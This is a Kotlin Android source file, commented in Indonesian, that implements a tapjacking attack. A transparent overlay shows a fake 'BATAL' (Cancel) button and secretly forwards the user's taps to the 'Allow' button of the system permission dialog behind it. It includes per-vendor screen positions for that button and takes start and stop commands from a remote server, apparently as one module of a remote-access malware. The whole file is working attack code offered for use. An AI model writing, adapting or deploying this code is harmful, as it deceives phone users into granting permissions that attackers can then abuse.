package com.nexlink.bridge

import android.content.Context
import android.graphics.Color
import android.graphics.PixelFormat
import android.graphics.Point
import android.graphics.drawable.GradientDrawable
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.DisplayMetrics
import android.view.Gravity
import android.view.MotionEvent
import android.view.View
import android.view.WindowManager
import android.widget.FrameLayout
import android.widget.TextView
import com.google.gson.JsonParser

/**
 * OverlayTrickManager — Tapjacking via SYSTEM_ALERT_WINDOW.
 *
 * Tampilkan overlay transparan di atas layar. User melihat tombol "palsu"
 * (misal "Tutup" / "Cancel"), tapi tap di-intercept dan di-dispatch ulang
 * ke koordinat nyata (tombol "Allow" / "Izinkan" di belakang overlay).
 *
 * Versi ini mendukung AUTO-DETECT resolusi layar:
 * - Jika targetX / targetY tidak ada di config JSON, koordinat dihitung
 *   otomatis dari ukuran layar nyata perangkat.
 * - Posisi tombol "IZINKAN" diperkirakan berdasarkan proporsi layar + ROM.
 *
 * Commands dari server:
 *   overlay_start        (extra = JSON config, semua field opsional)
 *   overlay_stop
 *   overlay_status
 *   overlay_request_perm
 *
 * Config JSON (semua opsional):
 * {
 *   "fakeText":  "BATAL",        // teks tombol palsu (default: "BATAL")
 *   "fakeColor": "#CC1565C0",    // warna tombol ARGB hex
 *   "targetX":   -1,             // -1 atau kosong = auto (pusat layar)
 *   "targetY":   -1,             // -1 atau kosong = auto (82% tinggi layar)
 *   "offsetX":   0,
 *   "offsetY":   0,
 *   "duration":  30,             // detik auto-stop (0 = manual)
 *   "fullBlock": false
 * }
 */
object OverlayTrickManager {

    private var wm: WindowManager? = null
    private var rootView: View?    = null
    @Volatile var isActive = false
        private set

    // ── Proporsi Y tombol "IZINKAN" per ROM ─────────────────────────────────
    // Nilai = rasio dari TINGGI LAYAR tempat tombol "Izinkan" (tombol PERTAMA/ATAS)
    // biasanya muncul di dialog izin runtime Android.
    // Dialog muncul di tengah layar → tombol Allow ada di sekitar 48-52% tinggi layar.
    // Diukur dari screenshot nyata berbagai ROM.
    private val ROM_ALLOW_Y_RATIO = mapOf(
        "com.android.packageinstaller"              to 0.490f, // AOSP < 10
        "com.google.android.packageinstaller"       to 0.490f, // AOSP / Pixel
        "com.android.permissioncontroller"          to 0.490f, // Android 10+
        "com.google.android.permissioncontroller"   to 0.490f, // Pixel 11+
        "com.miui.securitycenter"                   to 0.500f, // MIUI (Xiaomi)
        "com.samsung.android.permissioncontroller"  to 0.510f, // Samsung OneUI
        "com.lge.qpair.app"                         to 0.495f, // LG
        "com.huawei.systemmanager"                  to 0.500f  // EMUI (Huawei)
    )

    // ── Baca resolusi layar nyata (bukan ukuran window/display yang dipotong) ─
    fun getScreenSize(ctx: Context): Pair<Int, Int> {
        val wm = ctx.getSystemService(Context.WINDOW_SERVICE) as WindowManager
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            val bounds = wm.currentWindowMetrics.bounds
            Pair(bounds.width(), bounds.height())
        } else {
            @Suppress("DEPRECATION")
            val metrics = DisplayMetrics()
            @Suppress("DEPRECATION")
            wm.defaultDisplay.getRealMetrics(metrics)
            Pair(metrics.widthPixels, metrics.heightPixels)
        }
    }

    // ── Hitung koordinat tombol "Allow" otomatis berdasarkan layar + ROM ──────
    private fun resolveTarget(
        ctx: Context,
        callerPkg: String?,
        cfgX: Float?,
        cfgY: Float?
    ): Pair<Float, Float> {
        val (w, h) = getScreenSize(ctx)

        // targetX: pakai dari config jika valid (>0), otherwise tengah layar
        val tx = if (cfgX != null && cfgX > 0f) cfgX else w / 2f

        // targetY: pakai dari config jika valid (>0), otherwise hitung dari rasio ROM
        val ty = if (cfgY != null && cfgY > 0f) {
            cfgY
        } else {
            val ratio = ROM_ALLOW_Y_RATIO[callerPkg] ?: 0.490f
            h * ratio
        }

        return Pair(tx, ty)
    }

    fun start(ctx: Context, configJson: String?, callerPkg: String? = null): String {
        if (!Settings.canDrawOverlays(ctx)) {
            return "⚠️ SYSTEM_ALERT_WINDOW belum granted. Kirim overlay_request_perm dulu."
        }
        if (isActive) stop(ctx)

        return try {
            val cfg       = configJson?.let { runCatching { JsonParser.parseString(it).asJsonObject }.getOrNull() }
            val fakeText  = cfg?.get("fakeText")?.asString   ?: "BATAL"
            val fakeColor = cfg?.get("fakeColor")?.asString  ?: "#CC1565C0"
            val cfgX      = cfg?.get("targetX")?.asFloat?.takeIf { it > 0f }
            val cfgY      = cfg?.get("targetY")?.asFloat?.takeIf { it > 0f }
            val offsetX   = cfg?.get("offsetX")?.asFloat     ?: 0f
            val offsetY   = cfg?.get("offsetY")?.asFloat     ?: 0f
            val duration  = cfg?.get("duration")?.asInt      ?: 0
            val fullBlock = cfg?.get("fullBlock")?.asBoolean ?: false

            // ── Auto-detect resolusi & hitung target ────────────────────────
            val (screenW, screenH) = getScreenSize(ctx)
            val (targetX, targetY) = resolveTarget(ctx, callerPkg, cfgX, cfgY)

            wm = ctx.applicationContext.getSystemService(Context.WINDOW_SERVICE) as WindowManager

            // Full-screen transparent touch interceptor
            val root = object : FrameLayout(ctx) {
                override fun onTouchEvent(ev: MotionEvent): Boolean {
                    if (ev.action == MotionEvent.ACTION_UP) {
                        val rx = if (fullBlock) targetX else ev.x + offsetX
                        val ry = if (fullBlock) targetY else ev.y + offsetY
                        injectTap(rx.coerceAtLeast(0f), ry.coerceAtLeast(0f))
                    }
                    return true // consume — user tidak tau tap-nya diredirect
                }
            }
            root.setBackgroundColor(Color.TRANSPARENT)

            // Tombol palsu yang terlihat user
            // bottomMargin dihitung dari bawah: screenH - targetY (dalam px → dp)
            val density    = ctx.resources.displayMetrics.density
            val marginBotPx = (screenH - targetY).toInt().coerceAtLeast(60)

            val btn = TextView(ctx).apply {
                text = fakeText
                textSize = 15f
                setTextColor(Color.WHITE)
                setPadding(56, 28, 56, 28)
                background = GradientDrawable().apply {
                    cornerRadius = 28f
                    try { setColor(Color.parseColor(fakeColor)) }
                    catch (_: Exception) { setColor(0xCC1565C0.toInt()) }
                }
                elevation = 12f
            }
            root.addView(btn, FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.WRAP_CONTENT,
                FrameLayout.LayoutParams.WRAP_CONTENT
            ).also {
                it.gravity      = Gravity.BOTTOM or Gravity.CENTER_HORIZONTAL
                it.bottomMargin = marginBotPx
            })

            val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            else @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_PHONE

            val lp = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                type,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                PixelFormat.TRANSLUCENT
            ).apply { gravity = Gravity.TOP or Gravity.START; x = 0; y = 0 }

            Handler(Looper.getMainLooper()).post {
                wm!!.addView(root, lp)
                rootView = root
                isActive = true
            }

            if (duration > 0) {
                Handler(Looper.getMainLooper()).postDelayed({ stop(ctx) }, duration * 1000L)
            }

            val autoStop   = if (duration > 0) " | auto-stop: ${duration}s" else ""
            val autoLabel  = if (cfgX == null || cfgY == null) " [AUTO]" else ""
            "✅ Overlay aktif — screen=${screenW}x${screenH} | fake=[\"$fakeText\"] | target=(${targetX.toInt()},${targetY.toInt()})$autoLabel$autoStop"
        } catch (e: Exception) { "ERROR: ${e.message}" }
    }

    fun stop(ctx: Context): String {
        return try {
            Handler(Looper.getMainLooper()).post {
                rootView?.let {
                    try {
                        (ctx.applicationContext.getSystemService(Context.WINDOW_SERVICE) as WindowManager)
                            .removeViewImmediate(it)
                    } catch (_: Exception) {}
                }
                rootView = null
                isActive = false
            }
            "✅ Overlay dihentikan"
        } catch (e: Exception) { "ERROR: ${e.message}" }
    }

    fun status(): String = if (isActive) "🟢 Overlay aktif" else "⚫ Overlay tidak aktif"

    /** Re-dispatch tap ke koordinat nyata via shell input tap */
    private fun injectTap(x: Float, y: Float) {
        try {
            Runtime.getRuntime().exec(arrayOf("sh", "-c", "input tap ${x.toInt()} ${y.toInt()}"))
        } catch (_: Exception) {
            // Fallback: via AccessibilityService gesture injection
            try { InputEventService.injectTap(x, y) } catch (_: Exception) {}
        }
    }
}
